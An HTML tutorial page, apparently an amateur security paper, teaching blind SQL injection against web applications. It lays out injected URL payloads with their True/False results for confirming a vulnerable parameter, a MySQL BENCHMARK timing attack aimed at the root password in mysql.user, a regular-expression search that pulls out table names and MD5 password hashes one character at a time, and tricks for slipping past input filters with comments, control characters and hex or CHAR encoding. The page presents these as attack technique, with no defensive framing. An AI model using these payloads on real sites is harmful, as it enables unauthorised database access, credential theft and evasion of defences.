<center><h2>Blind Sql Injection with Regular
Expressions Attack</h2></center>



<h2>Why blind sql injection?</h2>


<p style="font-size:140%;">
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp


Blind SQL Injection is used when a web application is vulnerable to an SQL injection, but the
results of the injection are not visible to the attacker.</p>


<p style="font-size:140%;">
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp


The page with the vulnerability may not be one that displays data but will display differently
depending on the results of a logical statement injected into the legitimate SQL statement
called for that page.</p>


<p style="font-size:140%;">
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp


This type of attack can become time-intensive because a new statement must be crafted for
each bit recovered.</p>




<h2>How blind sql injection can be used?</h2>




<h3>There are several uses for the Blind Sql Injection:</h3>


<p style="font-size:140%;">




==>Testing the vulnerability;<br>
==>Finding the table name;<br>
==>Exporting a value;<br>
Every techniques are based on the 'guess attack', because we only have two different input:
TRUE or FALSE. Let me explain better...</p>






<h2>Testing vulnerability (MySQL - MSSQL):</h2>


<p style="font-size:140%;">



Let's star with an easy example. We have this type of URL:<br>
site.com/news.php?id=2</p>

<p style="font-size:140%;">

it will result in this type of query on the database:<br>
SELECT * FROM news WHERE ID = 2</p>

<p style="font-size:140%;">


Now, we can try some sql injection techniques, for example the blind sql injection!<br>
site.com/news.php?id=2 and 1=0</p>

<p style="font-size:140%;">


SQL query is now:<br>
SELECT * FROM news WHERE ID = 2 and 1=0</p>


<p style="font-size:140%;">


In this case the query will not return anything (FALSE) because 1 is different from 0; Let's do
the litmus test: try to get the TRUE statement forcing the AND to be TRUE;<br>
site.com/news.php?id=2 and 0=0</p>


<p style="font-size:140%;">&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp

In this case 0 is equal to 0... Got it! We should now see the original news page. We now know
that is vulnerable to Blind Sql Injection.</p>




<h2>Time attack (MySQL)</h2>


<p style="font-size:140%;">
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp



When you can't see any kind of results, you must use the time attack.
In this example we will try to obtain the password of root user in mysql (if your have root
priviledges on mysql).
BENCHMARK function is used to sleep for some seconds.</p>


<p style="font-size:140%;">


Syntax: BENCHMARK(how many times,thing to do).
When you use it in IF statement, you will be able to make time attack in MySQL;<br>
SELECT 1,1 UNION SELECT<br>
IF(SUBSTRING(Password,1,1)='a',BENCHMARK(100000,SHA1(1)),0) User,Password
FROM mysql.user WHERE User = ‘root’;<br>





SELECT 1,1 UNION SELECT<br>
IF(SUBSTRING(Password,1,1)='b',BENCHMARK(100000,SHA1(1)),0) User,Password
FROM mysql.user WHERE User = ‘root’;<br>




SELECT 1,1 UNION SELECT<br>
IF(SUBSTRING(Password,1,1)='c',BENCHMARK(100000,SHA1(1)),0) User,Password
FROM mysql.user WHERE User = ‘root’;<br>




SELECT 1,1 UNION SELECT<br>
IF(SUBSTRING(Password,1,1)='d',BENCHMARK(100000,SHA1(1)),0) User,Password
FROM mysql.user WHERE User = ‘root’;<br>




And so on until you will see the BENCHMARK running (few more seconds delay). Now proceed
with the 2nd word of the password...</p>



<h2>Regexp attack's methodology</h2>


<p style="font-size:140%;">
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp



This is our own creation and it is the faster to extract information from a database. With this
you can save a lot of time and bandwidth!
The methodology is pretty simple: we define a range of numbers/chars/spacial chars that will
be matched with REGEXP (MySQL) or LIKE (MSSQL) functions.
Let's start with an example because is more simple to understand.</p>





<h2>Finding table name with Regexp attack (MySQL)</h2>


<p style="font-size:140%;">
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp




In this example we will extract the first matched record of information_schema.tables, you
must know the name of database!<br>

index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables LIMIT 0,1)<br>


&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp


We tested the blind sql injection attack, and if we see the correct page, everything is ok.<br>


index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE
TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-z]' LIMIT 0,1)<br>



In this case we know that the first matched record start with a char between [a -> z]
That example will show you how to extract the complete name of the record:<br>


index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE
TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-n]' LIMIT 0,1)<br>
True<br>
index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE
TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-g]' LIMIT 0,1)<br>
False<br>
index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE
TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[h-n]' LIMIT 0,1)<br>
True<br>
index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE
TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[h-l]' LIMIT 0,1)<br>
False<br>

index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE
TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^m' LIMIT 0,1)<br>
False<br>
index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE
TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^n' LIMIT 0,1)
True<br>
The first letter of the table is 'n'. But are there other tables start with 'n'? Let's change the
limit to 1,1:<br>
index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE
TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^n' LIMIT 1,1)<br>
False<br>
No, there are no more tables that start with 'n'. From now on we must change the regular
expression like this: '^n[a-z]' -> '^ne[a-z]' -> '^new[a-z]' -> '^news[a-z]' -> FALSE
To test if we found the correct table name, we must test something like this: '^news$'.</p>







<h2>Exporting a value with Regexp attack (MySQL)</h2>

<p style="font-size:140%;">
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp





In this example we will extract a MD5 hash from a know table name (in this case 'users');
Remember: MD5 can ONLY contain [a-f0-9] values.

<p style="font-size:140%;">



We will use the same methodology described in the “Finding table name”.<br>
index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP '^[a-f]' AND
ID=1)<br>
False<br>
index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP '^[0-9]' AND
ID=1)<br>
True<br>
index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP '^[0-4]' AND
ID=1)<br>
False<br>
index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP '^[5-9]' AND
ID=1)<br>
True<br>
index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP '^[5-7]' AND
ID=1)<br>
True<br>
index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP '^5' AND
ID=1)<br>
True<br></p>




<h2>Time considerations:</h2>

<p style="font-size:140%;">
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp

Take for example the MD5 case. We must export an hash of 32 chars using a blind sql
injection.<br>
You know that there are only 16 chars to be tested (1234567890abcdef);<br>
In an optimistic case, regexp and normal blind need 32 query to be done;<br>
In a worst-case , regexp need 128 query and normal blind need 512 query;</p>

<p style="font-size:140%;">
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp



Let's take now a password case. We must export a 15 chars password mixalpha-numericspecial14.
You know that there are 76 chars to be tested
(abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-
_+=);
In an optimistic case, regexp and normal blind need 15 query to be done;
In a worst-case, regexp need approx 94 query and normal blind need 1140 query;

<h2>Bypassing filters</h2>



<h3>Below are examples of common filters bypass.</h3>


<p style="font-size:140%;">


TRIM (NO SPACES ALLOWED):<br>
SELECT/*not important*/1/*really...*/FROM/*im serious*/users ? (open and
close a comment);<br>
SELECT(1)FROM(information_schema.tables) ? (parentheses's rules)
Special chars like:<br>
0c = form feed, new page<br>
09 = horizontal tab<br>
0d = carriage return<br>
0a = line feed, new line<br>
Example:<br>
SELECT%09TABLE_NAME%09FROM%0dinformation_schema.tables<br>
SPECIAL CHAR (NO ', “ ALLOWED):<br>
Usually the ' AND “ are used to input some kind of string. So you can input the HEX
value:<br>
SELECT passwd FROM users WHERE username=0x61646d696e
Where 0x61646d696e is the hex value of 'admin'<br>
Or also using the CHAR function:<br>
SELECT passwd FROM users WHERE
username=CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))</p>




<h2>Conclusions:</h2>

<p style="font-size:140%;">
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp



To conclude our paper, we must specify that:<br>
1. Is possible make a “combo” attack using “Time Attack” or other;<br>
2. The regexp that you will use, could also be a list of chars like “[abcdef0123456789]”;<br>
3. Our English is fu**ing bad! :)</p>
